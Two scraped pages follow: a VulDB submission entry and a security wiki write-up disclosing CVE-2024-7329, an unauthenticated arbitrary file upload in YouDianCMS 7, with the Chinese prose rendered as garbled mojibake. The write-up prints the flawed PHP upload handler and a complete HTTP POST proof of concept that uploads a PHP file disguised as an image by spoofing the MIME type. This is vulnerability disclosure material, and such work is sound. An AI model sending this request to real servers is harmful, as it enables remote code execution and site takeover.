=== Content from vuldb.com_c9ab5173_20250110_221911.html ===
![VulDB](/_thm/vuldb.png)

* Home
  + Overview
  + [Live Recent](?live.recent)
  + [Live Updates](?live.updates)
  + [Live Archive](?live.archive)
  + [Live Submits](?live.submits)
* [Entries](?recent)
  + [Recent](?recent)
  + [Updates](?updates)
  + [Commits](?commits)
  + [Archive](?archive)
  + [CNA](?cna)
  + [Stats](?stats)
  + [Submits](?submits)
  + [Add](?id.add)
* [Products](?product)
  + [Vendor](?vendor)
  + [Product](?product)
  + [Type](?type)
* [Risk](?cvssv3)
  + [CVSSv4](?cvssv4)
  + [CVSSv3](?cvssv3)
  + [CVSSv2](?cvssv2)
  + [Risks](?risk)
  + [Exploits](?exploits)
* [Threat](?cti)
  + [Analysis](?cti.analyze)
  + [Activities](?activities)
  + [Events](?events)
  + [Actors](?actor)
  + [IP addresses](?ip)
  + [Country](?country)
  + [Sector](?sector)
  + [Exploit Prices](?exploitprices)
* [References](?references)
  + [References](?references)
  + [Tools](?tools)
  + [Videos](?videos)
  + [Google Hacking](?googlehacking)
  + [Exports](?export)
* [Search](?search)

  + [Search](?search)
  + [Advanced Search](?search.advanced)
  + [User](?user)
  + [Feeds](?feeds)
  + [API](?kb.api)
* [Support](?kb)
  + [Knowledge Base](?kb)
  + [FAQ](?kb.faq)
  + [Changelog](?kb.changelog)
  + [Roadmap](?kb.roadmap)
  + [Status](?status)
  + [Contact](?contact)
* [Login](?login)
  + [Login](?login)
  + [Signup](?signup)
  + [Purchase](?pay)
  + [Terms of Use](?kb.terms)

* [Live](?live.submits)
* [Submits](?submits)
* [Add](?id.add)
* [Policy](?kb.submission)
* [Purchase](?pay)

[Login](?login)[Signup](?signup)ğŸ›¡ Home[Submit](?submit)378324
# Submit #378324: é•¿æ²™å‹ç‚¹è½¯ä»¶ç§‘æŠ€æœ‰é™å…¬å¸ YouDianCMS 7 Unrestricted Upload[info](?kb.submission)

| Title | é•¿æ²™å‹ç‚¹è½¯ä»¶ç§‘æŠ€æœ‰é™å…¬å¸ YouDianCMS 7 Unrestricted Upload |
| --- | --- |
| Description | YouDianCMSï¼ˆå‹ç‚¹ä¼ä¸šç½‘ç«™ç®¡ç†ç³»ç»Ÿï¼‰æ˜¯ä¸€ä¸ªé›†PCç«™ã€æ‰‹æœºç«™ã€å¾®ç½‘ç«™ã€å¤šç«¯å°ç¨‹åºï¼ˆå¾®ä¿¡ã€ç™¾åº¦ã€æŠ–éŸ³/å¤´æ¡ã€æ”¯ä»˜å®ã€QQã€360å°ç¨‹åºï¼‰ã€APPäºä¸€ä½“çš„ä¼ä¸šå»ºç«™è§£å†³æ–¹æ¡ˆã€‚ YouDianCMS 7ç‰ˆæœ¬çš„å‰å° å­˜åœ¨ ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ã€‚æ”»å‡»è€…å¯ä»¥ç»•è¿‡MIMEç±»å‹æ£€æŸ¥ï¼Œä¸Šä¼ æ¶æ„çš„PHPæ–‡ä»¶åˆ°æœåŠ¡å™¨ã€‚ç”±äºç³»ç»Ÿæœªå¯¹ä¸Šä¼ æ–‡ä»¶è¿›è¡Œæœ‰æ•ˆçš„ç±»å‹éªŒè¯ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸€æ¼æ´ä¸Šä¼ å¹¶æ‰§è¡ŒæœåŠ¡å™¨ç«¯è„šæœ¬ï¼Œä»è€Œè·å–æœåŠ¡å™¨çš„æ§åˆ¶æƒé™ã€‚ |
| Source | âš ï¸ https://wiki.shikangsi.com/post/share/30c24c77-42e6-4a0c-b60b-e02d09dc325b |
| User | [XingYue\_Mstir (UID 72225)](?user.72225) |
| Submission | 07/21/2024 06:24 PM (6 months ago) |
| Moderation | 07/31/2024 02:14 PM (10 days later) |
| Status | [Accepted](?kb.submission) |
| VulDB Entry | [273252](?id.273252) [YouDianCMS 7 image\_upload.php files unrestricted upload] |
| Points | 20 |

[â—‚ Previous](?submit.378323)[Overview](?submit)[Next â–¸](?submit.378325)

# Do you need the next level of professionalism?

Upgrade your account now!

## Notice

Submissions are made by [VulDB community users](?user). VulDB is *not responsible* for their content nor the links to external sources.

Please use the raw information shown and the links listed *with caution*. They might contain malicious and harmful actions, code or data.

The corresponding VulDB entries contain the moderated, verified, and normalized information provided within the raw submission.

## Documentation

* [Submission Policy](?kb.submission)
* [Data Processing](?kb.processing)
* [CVE Handling](?kb.cna)
[Â© 1997-2025 vuldb.com](?kb.terms) Â· [cc by-nc-sa](https://creativecommons.org/licenses/by-nc-sa/4.0/)[de](/de/?submit.378324 "German") Â· [fr](/fr/?submit.378324 "French") Â· [it](/it/?submit.378324 "Italian") Â· [es](/es/?submit.378324 "Spanish") Â· [pt](/pt/?submit.378324 "Portuguese") Â· [ru](/ru/?submit.378324 "Russian") Â· [pl](/pl/?submit.378324 "Polish") Â· [sv](/sv/?submit.378324 "Swedish") Â· [zh](/zh/?submit.378324 "Chinese") Â· [ja](/ja/?submit.378324 "Japanese") Â· [ar](/ar/?submit.378324 "Arabic")[v18.14.7](?kb.changelog)

=== Content from wiki.shikangsi.com_8ff6fc18_20250110_221918.html ===

# å®‰å…¨å›¢é˜Ÿè´¡çŒ®å¹³å°

å¯¼èˆªåˆ‡æ¢

* [é¦–é¡µ](/)
* æ‰€æœ‰ä¿¡æ¯
  + [æ‰€æœ‰æƒ…æŠ¥](/list/all/)
  + [æ¨èä¸“åŒº](/list/recommend/)
  + [ç»¼åˆæƒ…æŠ¥](/list/wiki/)
  + [ç”¨æˆ·æäº¤](/list/userpost/)
  + [é«˜æ ¡æƒ…æŠ¥](/list/school/)
* [æ’è¡Œæ¦œ](/user/)
* [ç¤¼å“ä¸­å¿ƒ](/gift/)
* [æœç´¢](/search/)
* [å…¬å‘Š](/announcements/)
* [IPwhoisæ–°åŠŸèƒ½](/ip/)
* [WooYun dropsæ–°åŠŸèƒ½](/wooyun/)
* æ›´å¤š
  + [edudataå¹³å°](https://wiki.shikangsi.com/cas/jump/edudata)
  + [é›¶ç»„çŸ¥è¯†åº“-006åº”æ€¥å“åº”ç›®å½•](https://wiki.shikangsi.com/post/3629/)
  + [é›¶ç»„çŸ¥è¯†åº“-007å†…ç½‘æ¸—é€ç›®å½•](https://wiki.shikangsi.com/post/3631/)
  + [é›¶ç»„çŸ¥è¯†åº“-009å®‰å…¨æŠ€æœ¯ç›®å½•](https://wiki.shikangsi.com/post/3632/)
  + [é›¶ç»„çŸ¥è¯†åº“-010åŸŸæ¸—é€ç›®å½•](https://wiki.shikangsi.com/post/3633/)
  + [é›¶ç»„çŸ¥è¯†åº“-011è¿ç»´ä¸äºŒè¿›åˆ¶å®‰å…¨ç›®å½•](https://wiki.shikangsi.com/post/3634/)
  + [XSSå¹³å°](https://wiki.shikangsi.com/cas/jump/xss)
  + [edusrcæ•°æ®åˆ†æ](http://data.shikangsi.com/)
  + [å‹æƒ…é“¾æ¥](https://wiki.shikangsi.com/links/)
  + [wikiç¤¾åŒº](https://wiki.shikangsi.com/zone/)

[æäº¤è´¡çŒ®](/add/)

[ç™»å½•](/login/)

[æ³¨å†Œ](/register/)

# ã€åŸåˆ›ã€‘ï¼ˆCVE-2024-7329ï¼‰YouDianCMS 7 ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´

---

åˆ†äº«
### å½“å‰ä¸ºç§å¯†åˆ†äº«ï¼Œæ— éœ€ç™»å½•å³å¯æŸ¥çœ‹ã€‚

---

| æ—¶é—´ | ä½œè€… | å¯è§æ€§ | ç­‰çº§ | Rank |
| --- | --- | --- | --- | --- |
|| 2024-07-21 23:02:21 | [Mstir](/profile/607/) | å…¬å¼€çš„ | é«˜å± | 0 |
| --- | --- | --- | --- | --- |

CVE-2024-7329
Created: 07/31/2024 02:19 PM
Updated: 08/01/2024 01:20 PM
Changes: 07/31/2024 02:19 PM (55), 08/01/2024 03:25 AM (18), 08/01/2024 01:20 PM (1)
Submitter: Mstir@Wiki

---

# æ¼æ´æè¿°

> YouDianCMSï¼ˆå‹ç‚¹ä¼ä¸šç½‘ç«™ç®¡ç†ç³»ç»Ÿï¼‰æ˜¯ä¸€ä¸ªé›†PCç«™ã€æ‰‹æœºç«™ã€å¾®ç½‘ç«™ã€å¤šç«¯å°ç¨‹åºï¼ˆå¾®ä¿¡ã€ç™¾åº¦ã€æŠ–éŸ³/å¤´æ¡ã€æ”¯ä»˜å®ã€QQã€360å°ç¨‹åºï¼‰ã€APPäºä¸€ä½“çš„ä¼ä¸šå»ºç«™è§£å†³æ–¹æ¡ˆã€‚

YouDianCMS 7ç‰ˆæœ¬çš„å‰å° å­˜åœ¨ ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ã€‚æ”»å‡»è€…å¯ä»¥ç»•è¿‡MIMEç±»å‹æ£€æŸ¥ï¼Œä¸Šä¼ æ¶æ„çš„PHPæ–‡ä»¶åˆ°æœåŠ¡å™¨ã€‚ç”±äºç³»ç»Ÿæœªå¯¹ä¸Šä¼ æ–‡ä»¶è¿›è¡Œæœ‰æ•ˆçš„ç±»å‹éªŒè¯ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸€æ¼æ´ä¸Šä¼ å¹¶æ‰§è¡ŒæœåŠ¡å™¨ç«¯è„šæœ¬ï¼Œä»è€Œè·å–æœåŠ¡å™¨çš„æ§åˆ¶æƒé™ã€‚

# å®¡è®¡è¿‡ç¨‹

å®šä½åˆ°äº†ä¸€å¤„æ–‡ä»¶ä¸Šä¼ ç‚¹:

```
<?php
 define ( 'IN_BAMBOO', true );
 // å–å¾—æ ¹ç›®å½•
define ( 'ROOT_PATH', '../../../../' );  // back to your root path

$arrType = array (
        'image/jpg',
        'image/gif',
        'image/png',
        'image/bmp',
        'image/pjpeg',
        'image/jpeg'
);
$max_size = 500 * 1024; // æœ€å¤§æ–‡ä»¶é™åˆ¶ï¼ˆå•ä½ï¼šbyteï¼‰
$upfile = ROOT_PATH.'image/uploads'; // å›¾ç‰‡ç›®å½•è·¯å¾„
if (!isset($_FILES ['files'])){
    echo '{"result":"400","msg":"æœªèƒ½æ‰¾åˆ°å›¾ç‰‡ï¼Œè¯·ç¡®è®¤å›¾ç‰‡æ˜¯å¦è¿‡å¤§"}';
    exit ();
}
$file = $_FILES ['files'];

if ($_SERVER ['REQUEST_METHOD'] == 'POST') { // åˆ¤æ–­æäº¤æ–¹å¼æ˜¯å¦ä¸ºPOST
    if (! is_uploaded_file ( $file ['tmp_name'] )) { // åˆ¤æ–­ä¸Šä¼ æ–‡ä»¶æ˜¯å¦å­˜åœ¨
        echo '{"result":"400","msg":"å›¾ç‰‡ä¸å­˜åœ¨"}';
        exit ();
    }

    if ($file ['size'] > $max_size) { // åˆ¤æ–­æ–‡ä»¶å¤§å°æ˜¯å¦å¤§äº500000å­—èŠ‚
        echo '{"result":"400","msg":"ä¸Šä¼ å›¾ç‰‡å¤ªå¤§ï¼Œæœ€å¤§æ”¯æŒï¼š'.($max_size/1024).'KB"}';
        exit ();
    }
    if (! in_array ( $file ['type'], $arrType )) { // åˆ¤æ–­å›¾ç‰‡æ–‡ä»¶çš„æ ¼å¼
        echo '{"result":"400","msg":"ä¸Šä¼ å›¾ç‰‡æ ¼å¼ä¸å¯¹"}';
        exit ();
    }
    if (! file_exists ( $upfile )) { // åˆ¤æ–­å­˜æ”¾æ–‡ä»¶ç›®å½•æ˜¯å¦å­˜åœ¨
        mkdir ( $upfile, 0755, true );
    }
    $imageSize = getimagesize ( $file ['tmp_name'] );
    $img = $imageSize [0] . '*' . $imageSize [1];
    $fname = $file ['name'];
    $ftype = explode ( '.', $fname );
    $time = explode ( " ", microtime () );
    $time = $time [1] . ($time [0] * 1000);
    $time2 = explode ( ".", $time );
    $time = $time2 [0];
    $returnName=$time."." .end($ftype);
    $picName = $upfile . "/" . $returnName ;

    if (! move_uploaded_file ( $file ['tmp_name'], $picName )) {
        echo '{"result":"400","msg":"ä»:'.$file ['tmp_name'].'ç§»åŠ¨å›¾ç‰‡åˆ°:'.$picName.'å‡ºé”™"}';
        exit ();
    } else {
        echo '{"result":"200","imgurl":"image/uploads/' . $returnName . '"}';
    }
}

?>

```

å‘ç°å¹¶æœªæœ‰é‰´æƒ åªéœ€ç»•è¿‡MIMEå¤´å³å¯ä¸Šä¼ phpæ–‡ä»¶.

![null](/media/images/2024/07/21/1ef41508-e4a7-47c3-bbc1-204f4a2ac38c-LVEusH9i.png)

# POC

```
POST /Public/ckeditor/plugins/multiimage/dialogs/image_upload.php HTTP/1.1
Host: x.x.x.x
Content-Length: 202
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: null
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydAPjrmyKewWuf59H
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.3611
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8
Connection: close

------WebKitFormBoundarydAPjrmyKewWuf59H
Content-Disposition: form-data; name="files"; filename="c1.jpg.php"
Content-Type: image/jpg

<?php phpinfo();?>
------WebKitFormBoundarydAPjrmyKewWuf59H--

```

---

å®¡æ ¸è¯„ä»·ï¼š æ²¡æœ‰ä»»ä½•è¯„ä»·...

2014-2022 Â© è”ç³»é‚®ç®±ï¼šadmin@sg95.cnÂ Â Â Â [é„‚ICPå¤‡15020128å·-4](https://beian.miit.gov.cn)


